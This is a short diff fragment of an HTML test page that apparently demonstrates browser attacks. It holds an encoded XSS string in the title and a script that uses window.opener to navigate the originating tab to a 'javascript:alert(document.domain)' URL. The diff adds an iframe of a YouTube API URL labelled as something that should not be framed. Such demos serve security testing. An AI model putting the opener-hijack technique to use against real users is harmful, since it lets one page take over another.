@@ -3,6 +3,8 @@
 <meta charset="utf-8">
 <title>&#x3C;script&#x3E;alert(document.domain)&#x3C;/script&#x3E;</title>
 <h1>Why don’t you go back to the previous tab?</h1>
+
+<iframe src="https://gdata.youtube.com/feeds/api/videos?format=5&max-results=8&v=this shouldnt be framed&alt=jsonc">
 <script>
 	if (window.opener) {
 		opener.location = 'javascript:alert(document.domain)';
